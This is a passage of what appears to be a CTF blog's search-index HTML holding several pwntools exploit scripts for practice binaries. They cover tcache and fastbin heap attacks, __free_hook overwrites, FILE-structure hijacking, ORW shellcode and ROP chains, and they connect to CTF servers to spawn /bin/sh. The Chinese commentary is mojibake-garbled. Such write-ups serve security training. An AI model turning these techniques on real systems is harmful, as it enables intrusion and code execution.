one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=one_gadget[2]+leak_addr

payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook)

edit(0,payload)

add(0,0x10)
edit(0,p64(shell))

delete(0)

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">CISCN_2021_silverwolf&lonelywolf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6uuDjG65H/"" data-c="
          &lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./seethefile&amp;quot;)
io=remote(&amp;quot;chall.pwnable.tw&amp;quot;,10200)
libc=ELF(&amp;quot;./libc_32.so.6&amp;quot;)

def openn(cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;see :&amp;quot;,cc)


def readd():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    
def writee():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    
def closes():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)

def of():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)


openn(&#39;/proc/self/maps&#39;)
readd()
writee()
# readd()
# writee()


io.recvuntil(b&amp;quot;heap]\n&amp;quot;)

leak_addr=int(io.recv(8),16)+0x1000
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x20)
payload+=p32(0x804B284)
payload+=p32(0xffffdfff)
payload+=b&amp;quot;;/bin/sh&amp;quot;+b&amp;quot;\x00&amp;quot;*0x88  #ÁªìÊûÑ‰ΩìÂ§ßÂ∞è0x94
payload+=p32(0x804B284+0x98)
payload+=p32(sys_addr)*3

of()
io.recvuntil(b&amp;quot;name :&amp;quot;)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">pwnable_seethefile</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/glFiyd5Mk/"" data-c="
          &lt;p&gt;‰∏é‰∏ä‰∏ÄÁØáÊñáÁ´†‰∏ÄÊ†∑ÁöÑÊâìÊ≥ïÔºåÊ≥®ÊÑèÊ≠§Ê¨°Ê≤°ÊúâÂçïÁã¨Ê∏ÖÁ©∫&lt;code&gt;realloc_ptr&lt;/code&gt;ÁöÑÂáΩÊï∞ÔºåÂõ†Ê≠§Âú®ÂàÜÈÖçÂ†ÜÂùó‰∏äÈúÄÊ≥®ÊÑèÔºåÈÅøÂÖçÂá∫Áé∞&lt;code&gt;double free corruption&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    elf=ELF(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

    def malloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def calloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;2&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def realloc(s,cc):
        io.sendlineafter(b&amp;quot;Your choice: &amp;quot;,b&amp;quot;3&amp;quot;)
        io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
        io.sendafter(b&amp;quot;Data: &amp;quot;,cc)
        
    def delete(n):
        io.sendlineafter(b&amp;quot;Your &amp;quot;,b&amp;quot;4&amp;quot;)
        io.sendlineafter(b&amp;quot;Which: &amp;quot;,n)

    # gdb.attach(io)
    # pause()

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x10,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)

    for i in range(7):
        delete(b&amp;quot;r&amp;quot;)
        
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x60,b&amp;quot;ttt&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;eee&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
    malloc(0x90,payload) #Ê≠§Â§Ñ‰ΩøÁî®mallocÂàÜÈÖç
    # realloc(0,b&amp;quot;&amp;quot;)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
    malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
    sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=leak_addr+one_gadget[1]

    realloc(0x100,b&amp;quot;aaa&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete(b&amp;quot;r&amp;quot;)

    realloc(0,b&amp;quot;&amp;quot;)
    # delete(b&amp;quot;r&amp;quot;)
    realloc(0x60,b&amp;quot;qqq&amp;quot;)
    realloc(0x100,cyclic(0x68)+p64(0x91)+p64(free_hook))
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,p64(sys_addr))
    # realloc(0,b&amp;quot;&amp;quot;)

    calloc(0x10,b&amp;quot;/bin/sh\x00&amp;quot;)
    delete(b&amp;quot;c&amp;quot;)
    # delete(b&amp;quot;m&amp;quot;)

    io.interactive()
    
while True:
    try:
        io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26672)
        # io=process(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
        pwn()
    
    except:
        io.close()
        continue
~~&lt;/code&gt;&lt;/pre&gt;
">TWCTF_online_2019_asterisk_alloc wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IvtYDXMcd/"" data-c="
          &lt;p&gt;ËøôÈ¢òËÄÉÂØüreallocÂàÜÈÖçÂÜÖÂ≠òÂíåio leakÔºåglibc 2.27ÔºåÂèØ‰ª•Êâìtcache dupÂíåtcache posioningÔºåÂä´ÊåÅfree_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ÂΩìptr == nullptrÁöÑÊó∂ÂÄôÔºåÁõ∏ÂΩì‰∫émalloc(size)Ôºå ËøîÂõûÂàÜÈÖçÂà∞ÁöÑÂú∞ÂùÄ
ÂΩìptr != nullptr &amp;amp;&amp;amp; size == 0ÁöÑÊó∂ÂÄôÔºåÁõ∏ÂΩì‰∫éfree(ptr)ÔºåËøîÂõûÁ©∫ÊåáÈíà
ÂΩìsizeÂ∞è‰∫éÂéüÊù•ptrÊâÄÊåáÂêëÁöÑÂÜÖÂ≠òÁöÑÂ§ßÂ∞èÊó∂ÔºåÁõ¥Êé•Áº©Â∞èÔºåËøîÂõûptrÊåáÈíà„ÄÇË¢´ÂâäÂáèÁöÑÈÇ£ÂùóÂÜÖÂ≠ò‰ºöË¢´ÈáäÊîæÔºåÊîæÂÖ•ÂØπÂ∫îÁöÑbins‰∏≠Âéª
ÂΩìsizeÂ§ß‰∫éÂéüÊù•ptrÊâÄÊåáÂêëÁöÑÂÜÖÂ≠òÁöÑÂ§ßÂ∞èÊó∂ÔºåÂ¶ÇÊûúÂéüptrÊâÄÊåáÂêëÁöÑchunkÂêéÈù¢ÂèàË∂≥Â§üÁöÑÁ©∫Èó¥ÔºåÈÇ£‰πàÁõ¥Êé•Âú®ÂêéÈù¢Êâ©ÂÆπÔºåËøîÂõûptrÊåáÈíàÔºõÂ¶ÇÊûúÂêéÈù¢Á©∫Èó¥‰∏çË∂≥ÔºåÂÖàÈáäÊîæptrÊâÄÁî≥ËØ∑ÁöÑÂÜÖÂ≠òÔºåÁÑ∂ÂêéËØïÂõæÂàÜÈÖçsizeÂ§ßÂ∞èÁöÑÂÜÖÂ≠òÔºåËøîÂõûÂàÜÈÖçÂêéÁöÑÊåáÈíà
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âà©Áî®‰ª•‰∏äÊÄßË¥®ÂèØÁü•ÊØèÊ¨°ÂàÜÈÖçÂÆå‰πãÂêéÈúÄË¶ÅÂÜçÂàÜÈÖç‰∏ÄÊ¨°Âπ∂‰∏îÊòØ&lt;code&gt;ptr=null&lt;/code&gt;ÊâçÂèØ‰ª•Êõ¥Êñ∞ÂàÜÈÖçÁöÑÂú∞ÂùÄÔºåÂà©Áî®sizeÂèòÂåñÂèØ‰ª•Ë∂äÁïå‰øÆÊîπtcacheÁöÑ&lt;code&gt;fd&lt;/code&gt;ÊåáÈíà&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28342)
        # io=process(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    elf=ELF(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
    def add(s,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,str(s))
        io.sendafter(b&amp;quot;Content?\n&amp;quot;,cc)

    def delete():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

    def cl():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x100,b&amp;quot;qwe&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x10,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x100,b&amp;quot;qwe&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;qqq&amp;quot;)

    for i in range(7):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;) #‰øÆÊîπ0xa1‰∏∫0x91ÔºåÈò≤Ê≠¢ÂÖ∂freeÂêéÂõûÂà∞ÂéütcacheÂØºËá¥ÂêéÁª≠Áî≥ËØ∑Âá∫ÈóÆÈ¢ò
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)
    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=one_gadget[1]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
    free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
    sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr

    cl()

    add(0x100,b&amp;quot;ppp&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;a&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x81)+p64(free_hook-0x8))
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr))
    # add(0,b&amp;quot;&amp;quot;)
    delete()
    # io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,b&amp;quot;1&amp;quot;)


    io.interactive()

while True:
    try:
        pwn()
    except:
        io.close()
        continue

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">roarctf_2019_realloc_magic</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mqKBma3Sl/"" data-c="
          &lt;p&gt;seccomp dumpÂèëÁé∞Êú¨È¢òÁ¶ÅÁî®&lt;code&gt;execve()&lt;/code&gt;Á≥ªÁªüË∞ÉÁî®ÔºåÊïÖËÄÉËôëÊâìorwÔºåÁ®ãÂ∫è‰∏ÄÂºÄÂßãÂºÄËæü‰∏ÄÊÆµÂèØÂÜôÂèØÊâßË°åÊÆµÔºå‰∏îÂ≠òÂú®ÂáΩÊï∞&lt;code&gt;jmp_rsp&lt;/code&gt;ÔºåÂèØ‰ª•Â∞ÜÂÖ∂Â°´ÂÖÖËá≥retÂú∞ÂùÄÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ&lt;br&gt;
Ê≥®ÊÑèÊûÑÈÄ†readÁöÑshellcodeÊó∂Á≥ªÁªüË∞ÉÁî®Ôºå&lt;code&gt;rax=0&lt;/code&gt;&lt;br&gt;
&lt;s&gt;‰∏çÁÑ∂Â∞±ÊòØÊó†Â∞ΩÁöÑdebug&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25349)
# io=process(&amp;quot;./bad&amp;quot;)
elf=ELF(&amp;quot;./bad&amp;quot;)

jmp_rsp=0x400a01

jmp_shellcode=asm(&#39;&#39;&#39;
sub rsp,0x30
jmp rsp
&#39;&#39;&#39;)

orw_shellcode=asm(&#39;&#39;&#39;
  push   0x67616c66
  push   0x2
  pop    rax
  mov    rdi,rsp
  xor    rsi,rsi
  syscall 

  mov    rdi,rax
  xor    rax,rax
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall 

  push   0x1
  pop    rax
  xor rdi,rdi
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall
&#39;&#39;&#39;)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x123000
    pop rsi
    push 0x100
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x123000            
call rax
&#39;&#39;&#39;)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;fun!\n&amp;quot;)
payload=read_shellcode+call_shellcode
payload=payload.ljust(0x28,b&amp;quot;a&amp;quot;)+p64(jmp_rsp)+jmp_shellcode
io.send(payload)


io.recvuntil(b&amp;quot;d!\n&amp;quot;)
payload=orw_shellcode
# payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x123500,0x100)+shellcraft.write(1,0x123500,0x100))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Not Bad wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0AqzRuE5E/"" data-c="
          &lt;p&gt;Ê≥ÑÈú≤libc+&lt;code&gt;__environ&lt;/code&gt;Ê≥ÑÈú≤Ê†àÂú∞ÂùÄÊâìorw&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28492)
# io=process(&amp;quot;./intorw&amp;quot;)
elf=ELF(&amp;quot;./intorw&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

pop_rdi=next(elf.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=0x400726

def pre():
    io.sendlineafter(b&amp;quot;read\n&amp;quot;,b&amp;quot;-1&amp;quot;)
    io.recvuntil(b&amp;quot;read:\n&amp;quot;)


pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
pop_rsi=leak_addr+0x2be51 
pop_rdx_r12=leak_addr+0x11f497
pop_rax=leak_addr+0x45eb0
syscall_ret=leak_addr+0x091396

# gdb.attach(io)
# pause()

pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(environ)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

# gdb.attach(io)
# pause()

#open
orw=p64(pop_rdi)+p64(stack_addr-0x48)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


pre()

payload=cyclic(0x28)+orw+b&amp;quot;./flag\x00\x00&amp;quot;
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]intorw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k-TWvtUVK/"" data-c="
          &lt;h3 id=&#34;pwn_1&#34;&gt;PWN_1:&lt;/h3&gt;
&lt;p&gt;IO_FILE_plusÂêÑÁßçÂÅèÁßªÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
//IO_FILE_complete
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËæìÂÖ•Ë¥üÊï∞Ê∫¢Âá∫&lt;code&gt;(A0-20)/8&lt;/code&gt;Ôºàqword 8bytesÔºâÂèØ‰ª•ÂèçÂêëÊ∫¢Âá∫Ëá≥&lt;code&gt;stdout&lt;/code&gt;ÊåáÈíàÂ§ÑÔºåÂèØ‰ª•ÂÄüÊ≠§ÊéßÂà∂&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;ÁªìÊûÑ‰ΩìÔºåËøõËÄå‰øÆÊîπÁªìÊûÑ‰Ωì‰∏≠ÊàêÂëòÔºå‰øÆÊîπ&lt;code&gt;_flags&lt;/code&gt;‰∏∫&lt;code&gt;/bin/sh\x00&lt;/code&gt;Â≠óÁ¨¶‰∏≤&lt;br&gt;
&lt;code&gt;vtable&lt;/code&gt;‰∏∫&lt;code&gt;&amp;amp;_IO_2_1_stdout+0x10&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_save_base&lt;/code&gt;‰∏∫&lt;code&gt;system&lt;/code&gt;Âú∞ÂùÄ&lt;br&gt;
&lt;code&gt;_lock&lt;/code&gt;(&amp;amp;_IO_2_1_stdout+0x88Â§Ñ)ÂÄº‰øùÊåÅ‰∏çÂèòÔºàÂõ∫ÂÆöÂÅèÁßªÔºâ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685446603675.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;puts-&amp;gt;vtable-&amp;gt;_IO_2_1_stdout+0x10(Âéü _IO_new_file_xsputnÂÅèÁßª‰∏∫0x38Ôºå‰øÆÊîπÂêéÂÆûÈôÖË∞ÉÁî®+0x48,Âç≥_IO_save_base)-&amp;gt;system(_IO_save_base)&amp;lt;-&amp;quot;/bin/sh\x00&amp;quot;(Âéü_flagsÂ≠óÊÆµÂÅöÂèÇÊï∞)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.23ÊúâÊïàÔºå‰ª•‰∏äÊó†Êïà&lt;/p&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27333)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;aaa&amp;quot;)

payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(-0x10,len(payload),payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;_IO_file_jumps&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+libc_base
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_base
_IO_2_1_stdout=leak_addr+0x1f40


fs=FileStructure()
fs.flags=b&amp;quot;/bin/sh\x00&amp;quot;
fs.vtable=p64(_IO_2_1_stdout+0x10)
fs._IO_save_base=p64(sys_addr)
fs._lock=p64(libc_base+0x3c6780)


edit(-0x10,len(fs),bytes(fs))

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_2&#34;&gt;PWN_2:&lt;/h3&gt;
&lt;p&gt;‰∏ÄÈÅìfastbin attackÊâìone_gadget,&lt;code&gt;realloc&lt;/code&gt;Ë∞ÉÂÅèÁßª&lt;br&gt;
deleteÊìç‰ΩúÊØèÊ¨°ÊåáÈíàÁΩÆÁ©∫Ôºå‰ΩÜÊòØÊúâupdateÂáΩÊï∞off by oneÂèØ‰ª•‰øÆÊîπÊåáÈíà‰Ωé‰ΩçÔºåÂèØ‰ª•ÊåáÂêë‰ªªÊÑèÂ†ÜÂùóËøõË°åÊìç‰Ωú&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29081)
# io=process(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def pre(cc):
    io.recvuntil(b&amp;quot;name\n&amp;quot;)
    io.send(cc)
    
def add(s):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size\n&amp;quot;,str(s))
    
def delete():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;2&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;3&amp;quot;)
        
def update(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)
    
def edit(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;5&amp;quot;)
    io.sendafter(b&amp;quot;note\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

pre(cyclic(0x30))

add(0x90)
add(0x30)
update(cyclic(0x30)+b&amp;quot;\x10&amp;quot;)
delete()

add(0x20)
# edit(cyclic(0x18)+p64(0x10))
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)

show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
